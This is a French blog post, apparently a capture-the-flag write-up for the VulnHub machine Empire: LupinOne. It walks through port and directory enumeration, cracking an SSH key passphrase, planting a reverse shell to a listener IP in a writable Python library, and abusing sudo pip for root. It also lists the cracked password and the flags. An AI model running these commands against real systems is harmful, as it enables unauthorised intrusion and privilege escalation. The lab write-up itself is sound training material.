{"hash":"e9e710b63b02d049a9f8a5359c5c22618737fe2f","data":{"post":{"title":"CTF Empire: LupinOne","date":"7 November 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.3</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.38</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir EmpireLupinOne &amp;&amp; cd EmpireLupinOne</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -sV -sT -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">8</span>.4p1 Debian <span class=\"token number\">5</span> <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.48 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Debian<span class=\"token punctuation\">))</span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.4.48 sur le port <strong>80</strong>.<br>\nDans le fichier \"robots.txt\", on trouve un indice.</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">User-agent: *\nDisallow: /~myfiles</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On va utiliser l'outil <strong>Ffuf</strong> au lieu de <strong>Wfuzz</strong> pour découvrir le ou les pages présentes à la racine du serveur Apache par mot clef.</p>\n<p>Remarque: <strong>Ffuf</strong> n'est pas installé par défaut sur <a href=\"https://www.kali.org/tools/ffuf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Kali Linux</a>. Il faut lancer la commande d'installation <code class=\"language-text\">sudo apt install ffuf</code>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <span class=\"token string\">'http://192.168.1.38/~FUZZ'</span>\nsecret</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On a une page \"~secret\" et un utilisateur potentiel \"icex64\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token function\">curl</span> http://<span class=\"token variable\">$IP</span>/~secret/ \n<span class=\"token operator\">&lt;</span>br<span class=\"token operator\">></span>Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create <span class=\"token function\">ssh</span> private key file,<span class=\"token operator\">&lt;</span>/<span class=\"token operator\">></span> \n<span class=\"token operator\">&lt;</span>br<span class=\"token operator\">></span>Its hided somewhere here, so that hackers dont <span class=\"token function\">find</span> it and crack my passphrase with fasttrack.<span class=\"token operator\">&lt;</span>/<span class=\"token operator\">></span> \n<span class=\"token operator\">&lt;</span>br<span class=\"token operator\">></span>I'm smart I know that.<span class=\"token operator\">&lt;</span>/<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>br<span class=\"token operator\">></span>Any problem <span class=\"token builtin class-name\">let</span> me know<span class=\"token operator\">&lt;</span>/<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>h<span class=\"token operator\"><span class=\"token file-descriptor important\">4</span>></span>Your best friend icex6<span class=\"token operator\"><span class=\"token file-descriptor important\">4</span>&lt;</span>/<span class=\"token operator\">></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>En partant du principe que c'est un répertoire secret, on cherche un fichier texte préfixé par un point.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <span class=\"token string\">'http://192.168.1.38/~secret/.FUZZ'</span> -e .txt -fc <span class=\"token number\">403</span>\nmysecret.txt</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Le contenu de ce fichier contient une chaine de caractères qui se révèle être du <a href=\"https://www.dcode.fr/identification-chiffrement\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Base58</a> que l'on peut déchiffrer sur le même site <a href=\"https://www.dcode.fr/chiffre-base-58\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Dcode.fr</a>.</p>\n<p>On a une clef SSH qui commence par <code class=\"language-text\">-----BEGIN OPENSSH PRIVATE KEY-----</code> et se termine par <code class=\"language-text\">-----END OPENSSH PRIVATE KEY-----</code> que l'on copie dans une nouveau fichier \"id_rsa.pem\" dont on change le chmod <code class=\"language-text\">chmod 600 id_rsa.pem</code>.</p>\n<p>Avec <strong>ssh2john</strong>, on copie le hash dans un nouveau fichier <code class=\"language-text\">/usr/share/john/ssh2john.py id_rsa.pem &gt; hash</code> afin de trouver le mot de passe avec <strong>John the Ripper</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ john <span class=\"token builtin class-name\">hash</span> --wordlist<span class=\"token operator\">=</span>/usr/share/wordlists/fasttrack.txt\nP@55w0rd<span class=\"token operator\">!</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Pénétration</h2>\n<p>On a l'utilisateur, la clef SSH et le mot de passe.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> icex64@<span class=\"token variable\">$IP</span> -i id_rsa.pem\npassword: P@55w0rd<span class=\"token operator\">!</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Dans le répertoire de l'utilisateur, on trouve le premier flag.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> user.txt\n3mp<span class=\"token operator\">!</span>r3<span class=\"token punctuation\">{</span>I_See_That_You_Manage_To_Get_My_Bunny<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>Ensuite, on regarde les privilèges de l'utilisateur courant.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\nUser icex64 may run the following commands on LupinOne:\n    <span class=\"token punctuation\">(</span>arsene<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On peut exécuter ce script Python avec l'utilisateur \"arsene\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /home/arsene/heist.py \n<span class=\"token function\">import</span> webbrowser\n\nprint <span class=\"token punctuation\">(</span><span class=\"token string\">\"Its not yet ready to get in action\"</span><span class=\"token punctuation\">)</span>\n\nwebbrowser.open<span class=\"token punctuation\">(</span><span class=\"token string\">\"https://empirecybersecurity.co.mz\"</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Le script ne contient quasiment rien, si ce n'est la librairie \"webbrowser\". Sur le <a href=\"https://github.com/python/cpython/blob/3.10/Lib/webbrowser.py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Github</a> de cette librarie, on voit que la librairie \"Os\" est utilisée. On va donc modifier cette dernière (on n'a pas les droit d'écriture sur le script final) afin d'exécuter un webshell.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">find</span> / -name webbrowser.py\n/usr/lib/python3.9/webbrowser.py\n-rwxrwxrwx <span class=\"token number\">1</span> root root <span class=\"token number\">24087</span> Oct  <span class=\"token number\">4</span> <span class=\"token number\">18</span>:45 /usr/lib/python3.9/webbrowser.py\n$ <span class=\"token function\">nano</span> /usr/lib/python3.9/webbrowser.py\nos.system<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash -c '/bin/bash -i >&amp; /dev/tcp/192.168.1.33/1234 0>&amp;1'\"</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Dans un autre onglet du terminal, on démarre le serveur <strong>Netcat</strong> sur le port \"1234\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">nc</span> -lnvp <span class=\"token number\">1234</span>\nlistening on <span class=\"token punctuation\">[</span>any<span class=\"token punctuation\">]</span> <span class=\"token number\">1234</span> <span class=\"token punctuation\">..</span>.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Puis on exécute le script Python <code class=\"language-text\">sudo -u arsene python3.9 /home/arsene/heist.py</code> et la connexion est effective avec l'utilisateur \"arsene\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\nUser arsene may run the following commands on LupinOne:\n    <span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/pip</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>L'utilisateur a le droit d'éxécuter le gestionnaire de paquets de Python, <strong>PIP</strong>.</p>\n<p>Avant tout, il faut se mettre en Shell <code class=\"language-text\">python3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code> pour pouvoir effectuer les commandes recommandées par <a href=\"https://gtfobins.github.io/gtfobins/pip/#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GTFOBins</a></p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token assign-left variable\">TF</span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">$(</span>mktemp -d<span class=\"token variable\">)</span></span>\n$ <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"import os; os.execl('/bin/bash', 'bash', '-c', 'bash &lt;<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">tty</span><span class=\"token variable\">)</span></span> ><span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">tty</span><span class=\"token variable\">)</span></span> 2><span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">tty</span><span class=\"token variable\">)</span></span>')\"</span> <span class=\"token operator\">></span> <span class=\"token variable\">$TF</span>/setup.py\n$ <span class=\"token function\">sudo</span> pip <span class=\"token function\">install</span> <span class=\"token variable\">$TF</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On est bien en root et on trouve le dernier flag.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/root.txt\n3mp<span class=\"token operator\">!</span>r3<span class=\"token punctuation\">{</span>congratulations_you_manage_to_pwn_the_lupin1_box<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/empire-lupinone,750","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":4,"parts":[]}},"context":{}}